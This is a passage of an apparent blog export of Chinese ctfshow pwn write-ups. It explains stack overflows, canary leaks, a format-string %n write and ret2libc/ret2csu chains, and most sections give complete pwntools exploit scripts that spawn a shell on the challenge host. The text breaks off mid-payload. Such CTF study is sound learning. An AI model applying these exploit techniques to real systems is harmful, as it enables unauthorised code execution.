{"title":"ctfshow-pwn","uid":"52662f34cef48ec0871eed4c3bef0137","slug":"ctfshow-pwn","date":"2021-10-17T09:55:50.000Z","updated":"2021-11-06T02:20:32.088Z","comments":true,"path":"api/articles/ctfshow-pwn.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/ctwdE4PqChNIpzb.jpg","content":"<h1 id=\"pwn03\"><a href=\"#pwn03\" class=\"headerlink\" title=\"pwn03\"></a>pwn03</h1><p>将附件拖进IDA中很容易发现存在栈溢出，但是没有后门函数以及system函数，也不能利用系统调用<img src=\"https://i.loli.net/2021/10/16/SdbDYyzAl3TumcV.png\" alt=\"image.png\"></p>\n<p>所以函数地址泄露获得libc版本来获得system函数地址从而获得shell。具体步骤：</p>\n<ul>\n<li>泄露 puts地址</li>\n<li>获取 libc 版本</li>\n<li>获取 system 地址与 /bin/sh 的地址</li>\n<li>再次执行源程序</li>\n<li>触发栈溢出执行 system(‘/bin/sh’)</li>\n</ul>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28015</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./stack1&#x27;</span>)</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]       <span class=\"comment\"># 获取puts的plt</span></span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]           <span class=\"comment\"># 获取puts的got</span></span><br><span class=\"line\">start_addr = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]          <span class=\"comment\"># 获取程序开始地址</span></span><br><span class=\"line\">payload1 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">13</span>,puts_plt,start_addr,puts_got])         <span class=\"comment\"># 泄露puts的got地址</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\n\\n&#x27;</span>)         <span class=\"comment\"># 这里耽误了好久，因为要读取掉两个换行符，不然后面获取地址就会出错</span></span><br><span class=\"line\">libc_puts_addr = u32(p.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])          <span class=\"comment\"># 接收泄露的地址</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)        <span class=\"comment\"># 找到对应的libc</span></span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)         <span class=\"comment\"># 计算基地址</span></span><br><span class=\"line\">sys_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)         <span class=\"comment\"># 算出system函数的地址</span></span><br><span class=\"line\">bin_sh = libcbase+libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">13</span>,sys_addr,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">4</span>,bin_sh])</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn04\"><a href=\"#pwn04\" class=\"headerlink\" title=\"pwn04\"></a>pwn04</h1><p>用ida打开发现存在明显的栈溢出并且还存在后门函数<img src=\"https://i.loli.net/2021/10/16/YkhGbwR5uyam1Np.png\" alt=\"屏幕截图 2021-10-16 181459.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/16/odXSjLRgc1mpGra.png\" alt=\"屏幕截图 2021-10-16 181732.png\"></p>\n<p>checksec查看发现存在canary保护，所以思路就是绕过canary保护进入后门函数从而获取shell</p>\n<p>通过IDA查看可以发现canary在ebp-c的位置，所以我们可以利用第一轮输入来泄露canary</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Hello Hacker!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">a = p.recvline()</span><br><span class=\"line\">canary = p.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>因为存在回显所以要将回显接收不然canary就会出错，已经踩坑</strong></p>\n<p><img src=\"https://i.loli.net/2021/10/16/Wof2tuehQjwRYgx.png\" alt=\"屏幕截图 2021-10-16 182347.png\"></p>\n<p>获取了canary接下来就是绕过canary进入后门函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span>,canary,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>,get_shell])</span><br><span class=\"line\">p.sendline(payload2)</span><br></pre></td></tr></table></figure>\n\n<p><strong>因为canary是四个字节，而到返回地址还需要0x70-0x64-4=8个字节，所以需要补充8个字节</strong></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><p>exp1:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28132</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./ex2&#x27;)</span></span><br><span class=\"line\">get_shell = <span class=\"number\">0x80485AF</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Hello Hacker!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">a = p.recvline()</span><br><span class=\"line\">canary = p.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">payload2 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span>,canary,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>,get_shell])</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>exp2：</p>\n<p>也是通过printf泄露，不过是通过计算canary到printf的偏移来泄露</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./ex&quot;)</span></span><br><span class=\"line\">p =remote(<span class=\"string\">&quot;111.231.70.44&quot;</span>,<span class=\"number\">28097</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">leak_canary = <span class=\"string\">&quot;%31$x&quot;</span></span><br><span class=\"line\">p.sendline(leak_canary)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(p.recv(),<span class=\"number\">16</span>)</span><br><span class=\"line\">print(<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\">getshell = <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">100</span> + p32(canary) + <span class=\"string\">b&quot;b&quot;</span> * <span class=\"number\">12</span> + p32(<span class=\"number\">0x0804859B</span>)</span><br><span class=\"line\">p.sendline(getshell)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn07\"><a href=\"#pwn07\" class=\"headerlink\" title=\"pwn07\"></a>pwn07</h1><p>打开发现是64位程序，分析一下发现pwn03做法相同，泄露函数地址从而获取libc版本找到system函数进而获取shell。在某些细节上还是有点不同，32位是通过栈传递参数，而64位是通过寄存器传递参数(当参数小于7个时，参数从左到右放入寄存器rdi,rsi,rdx,rcx,r8,r9)，所以执行system(“bin/sh”)时rdi寄存器要存储的是bin/sh字符串，例如：</p>\n<p>泄露puts函数需要先将puts的got表地址传递到rdi寄存器中在跳转到puts函数输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure>\n\n<p>在执行system函数时不仅要记住通过rdi传参还要注意堆栈对齐：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(ret_addr)目的用于堆栈对齐，不然后面会报错。</p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28138</span>)</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04006e3</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x0004006E4</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn1&#x27;</span>)</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">start_addr = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\x0a&#x27;</span>)</span><br><span class=\"line\">libc_puts_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)</span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">sys_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">bin_sh = libcbase+libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn10\"><a href=\"#pwn10\" class=\"headerlink\" title=\"pwn10\"></a>pwn10</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%a  浮点数、十六进制数字和p-记数法（c99</span><br><span class=\"line\">%A  浮点数、十六进制数字和p-记法（c99）</span><br><span class=\"line\">%c  一个字符(char)</span><br><span class=\"line\">%C  一个ISO宽字符</span><br><span class=\"line\">%d  有符号十进制整数(int)（%ld、%Ld：长整型数据(long),%hd：输出短整形。）　</span><br><span class=\"line\">%e  浮点数、e-记数法</span><br><span class=\"line\">%E  浮点数、E-记数法</span><br><span class=\"line\">%f  单精度浮点数(默认float)、十进制记数法（%.nf  这里n表示精确到小数位后n位.十进制计数）</span><br><span class=\"line\">%g  根据数值不同自动选择%f或%e．</span><br><span class=\"line\">%G  根据数值不同自动选择%f或%e.</span><br><span class=\"line\">%i  有符号十进制数（与%d相同）</span><br><span class=\"line\">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置</span><br><span class=\"line\">%o  无符号八进制整数</span><br><span class=\"line\">%p  指针</span><br><span class=\"line\">%s  对应字符串char*（%s &#x3D; %hs &#x3D; %hS 输出 窄字符）</span><br><span class=\"line\">%S  对应宽字符串WCAHR*（%ws &#x3D; %S 输出宽字符串）</span><br><span class=\"line\">%u  无符号十进制整数(unsigned int)</span><br><span class=\"line\">%x  使用十六进制数字0xf的无符号十六进制整数　</span><br><span class=\"line\">%X  使用十六进制数字0xf的无符号十六进制整数</span><br><span class=\"line\">%%  打印一个百分号 </span><br><span class=\"line\">%I64d 用于INT64 或者 long long</span><br><span class=\"line\">%I64u 用于UINT64 或者 unsigned long long</span><br><span class=\"line\">%I64x 用于64位16进制数据</span><br><span class=\"line\">%m.n : m指域宽，即对应的输出项在输出设备上所占的字符数。n指精度。用于说明输出的实型数的小数位数。为指定n时，隐含的精度为n&#x3D;6位。</span><br><span class=\"line\">l 对整型指long型，对实型指double型。h用于将整型的格式字符修正为short型。</span><br></pre></td></tr></table></figure>\n\n<p>打开后发现当num==16时就可以得到flag，但是没有栈溢出可以覆盖num的值。仔细观察，这里输出用的是printf函数存在格式字符串漏洞，我们可以利用%n去修改num，首先需要num的地址，其次需要一个参数指向num。通过发现我们可以看到scanf对format赋值了两次，所以我们可以先将num的地址赋给format，接下来使用%n来修改format指向num的值</p>\n<p><img src=\"https://i.loli.net/2021/10/26/hMP7uoKZlkewSvn.png\" alt=\"屏幕截图 2021-10-26 092828.png\"></p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28101</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./pwn10&quot;)</span></span><br><span class=\"line\">num_addr = <span class=\"number\">0x0804A030</span></span><br><span class=\"line\">payload = p32(num_addr)+<span class=\"string\">&quot;aaaaaaaaaaaa%7$n&quot;</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"萌新赛-签到题\"><a href=\"#萌新赛-签到题\" class=\"headerlink\" title=\"萌新赛-签到题\"></a>萌新赛-签到题</h1><p>就是简单的libc泄露。计算一下src的偏移，找到相应gadget泄露函数地址在获得libc的版本获取system函数和字符串bin/sh地址，最后组装一下就行</p>\n<p><img src=\"https://i.loli.net/2021/10/26/6IxpjB9mK4WbrRO.png\" alt=\"屏幕截图 2021-10-26 124355.png\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./pwn_check_in&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;pwn_check_in&#x27;</span>)</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">start_addr=elf.symbols[<span class=\"string\">&quot;_start&quot;</span>]</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x400793</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x40053e</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x78</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;[+] command successful!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;hhh,just a joke&#x27;</span>)</span><br><span class=\"line\">puts_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;puts&quot;</span>,puts_addr)</span><br><span class=\"line\">libcbase=puts_addr-libc.dump(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\">system_addr=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x78</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;[+] command successful!\\n&#x27;</span>,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"内部赛-签到题\"><a href=\"#内部赛-签到题\" class=\"headerlink\" title=\"内部赛-签到题\"></a>内部赛-签到题</h1><p>此题与ret2csu做法相同，因为没有puts函数但是存在write函数，所以我们采取组装write函数来泄露地址，从而获取system函数以及bin/sh地址。</p>\n<p><img src=\"https://i.loli.net/2021/10/26/DlpyIGKWCtjqRVQ.png\" alt=\"屏幕截图 2021-10-26 201620.png\"></p>\n<p>gadgets和ret2csu里面的有点不一样但是大致是一样的。我们利用这两个gadgets来组装write函数，泄露我们想泄露函数的got表中地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0xa8</span>+p64(gadget1)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(got_write)+p64(<span class=\"number\">8</span>)+p64(got_write)+p64(<span class=\"number\">1</span>)+p64(gadget2)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">56</span>+ p64(start)</span><br></pre></td></tr></table></figure>\n\n<p>之后利用泄露的地址计算system函数以及bin/sh地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libcbase = write_addr-libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>最后组装payload2来控制程序执行system(“bin/sh”)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0xa8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EXP-3\"><a href=\"#EXP-3\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./ret2libc_64&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28177</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;ret2libc_64&#x27;</span>)</span><br><span class=\"line\">got_write = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">got_write = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">start = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]  </span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04006c3</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x004004a9</span></span><br><span class=\"line\">gadget1 = <span class=\"number\">0x4006b6</span></span><br><span class=\"line\">gadget2 = <span class=\"number\">0x04006A0</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0xa8</span>+p64(gadget1)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(got_write)+p64(<span class=\"number\">8</span>)+p64(got_write)+p64(<span class=\"number\">1</span>)+p64(gadget2)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">56</span>+ p64(start)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;now,Try Pwn Me?\\n&#x27;</span>,payload1)</span><br><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libcbase = write_addr-libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0xa8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;now,Try Pwn Me?\\n&#x27;</span>,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"36D杯-签到\"><a href=\"#36D杯-签到\" class=\"headerlink\" title=\"36D杯-签到\"></a>36D杯-签到</h1><p>签到题直接nc上去以后发现考察的是linux的基本操作，程序过滤掉了空格，cat，但是我们可以ls查看</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">more&lt;flag               这里&lt;可以绕过空格</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"BJDCTF2020-babyrouter\"><a href=\"#BJDCTF2020-babyrouter\" class=\"headerlink\" title=\"BJDCTF2020-babyrouter\"></a>BJDCTF2020-babyrouter</h1><p>不知道是远端有问题还是libc库不全，本地打通了但是远端没有打通，反正思路在这里</p>\n<p>很明显的一道libc泄露题目，buf的偏移是0x20</p>\n<p><img src=\"https://i.loli.net/2021/10/28/ZzYUNXD4uvWScVy.png\" alt=\"屏幕截图 2021-10-28 193359.png\"></p>\n<p>寻找gadgets</p>\n\n\n<p>构造payload1，payload2</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span 